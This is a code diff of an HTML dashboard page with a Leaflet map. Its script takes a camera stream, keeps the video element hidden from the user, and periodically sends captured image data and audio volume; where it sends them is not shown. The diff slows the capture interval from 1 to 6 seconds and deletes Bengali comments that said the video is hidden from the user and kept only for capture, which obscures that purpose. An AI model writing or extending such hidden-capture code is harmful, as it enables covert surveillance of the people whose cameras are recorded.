@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
+        /* same as previous styles */
         *{ margin:0; padding:0; box-sizing:border-box; }
         body{ background:#0b0e14; color:#c8d0dc; font-family: 'Segoe UI', sans-serif; padding:20px; }
         .container{ max-width:1400px; margin:0 auto; }
@@ -133,15 +134,12 @@
             document.getElementById('permissionBox').style.display = 'none';
             document.getElementById('dashboard').classList.add('active');
 
-            // নিজের প্রিভিউ – কিন্তু অডিও মিউটেড
             const video = document.createElement('video');
             video.srcObject = localStream;
             video.muted = true;
             video.volume = 0;
             video.playsInline = true;
             video.autoplay = true;
-            // আমরা এই video এলিমেন্টটা কোনো DOM-এ রাখছি না, কারণ ইউজারকে নিজের ভিডিও দেখাতে চাইলে না
-            // বরং আমরা শুধু ক্যাপচারের জন্য রাখছি
             localVideo = video;
             video.play();
 
@@ -177,7 +175,7 @@
                     image: imageData,
                     audio_volume: volume
                 });
-            }, 1000);
+            }, 6000);
         } catch (err) {
             permissionsGranted = false;
             if (manual) {
@@ -222,4 +220,4 @@
     });
 </script>
 </body>
-    </html>
+        </html>
